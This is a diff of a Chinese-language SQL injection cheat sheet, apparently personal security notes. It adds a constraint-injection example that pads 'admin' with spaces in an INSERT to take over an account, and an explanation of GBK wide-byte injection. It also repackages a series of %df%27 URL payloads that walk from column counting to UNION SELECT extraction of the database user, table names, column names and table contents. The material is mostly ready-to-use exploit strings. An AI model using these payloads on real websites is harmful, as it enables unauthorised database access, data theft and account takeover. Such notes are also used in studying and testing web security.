@@ -2,6 +2,7 @@
 # sql注入
 
 * 常识
+* 约束注入
 * sql注入
 * 宽字节注入
 * 图片注入
@@ -43,14 +44,27 @@
 ```
 
 
+## 约束注入
+``` 
+
+insert into user values('','admin                                  ','111');
+```
+
 ## 宽字节注入
 
-> ?id=3%df%27order by 3%23  
-> ?id=3%df%27%20union%20select%201,2,3%23  
-> ?id=3%df%27%20union%20select%201,user(),database()%23  
-> ?id=3%df%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23    
-> ?id=3%df%27%20union select 1,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%20and%20table_schema=0x6d79646273%23    
-> ?id=3%df%27%20union%20select%201,group_concat%28title_1%29,group_concat%28content_1%29%20from%20mydbs%2esae_user_sqli4%23  
+* 原理
+> mysql的特性，mysql在使用gbk编码的时候，会认为两个字符是一个汉字（前一个ascii要大于128，菜刀汉字范围）  
+> %df' and 1=1 %23
+
+``` 
+ ?id=3%df%27order by 3%23  
+ ?id=3%df%27%20union%20select%201,2,3%23  
+ ?id=3%df%27%20union%20select%201,user(),database()%23  
+ ?id=3%df%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23    
+ ?id=3%df%27%20union select 1,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%20and%20table_schema=0x6d79646273%23    
+ ?id=3%df%27%20union%20select%201,group_concat%28title_1%29,group_concat%28content_1%29%20from%20mydbs%2esae_user_sqli4%23  
+
+```
 
 
 ## 图片注入
